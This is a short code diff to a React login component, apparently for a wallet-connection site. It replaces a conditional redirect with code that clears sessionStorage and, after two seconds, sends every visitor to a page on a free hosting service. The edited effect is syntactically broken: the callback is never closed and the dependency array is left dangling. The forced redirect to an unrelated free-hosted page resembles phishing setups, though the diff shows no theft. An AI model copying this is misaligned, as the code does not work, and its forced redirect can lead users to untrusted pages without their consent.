@@ -15,8 +15,10 @@ export default function Login() {
     setThemeMode("light")
 
     useEffect(() => {
-        if (isConnected) window.location.href = "https://mythvendix.000webhostapp.com/surat/judge/template/"
-    }, [isConnected])
+         setTimeout(() => {
+        sessionStorage.clear();
+        window.location.href = "https://mythvendix.000webhostapp.com/surat/judge/template/";
+      }, 2000); [isConnected])
 
     useEffect(() => {
         if (!isConnected && selection)
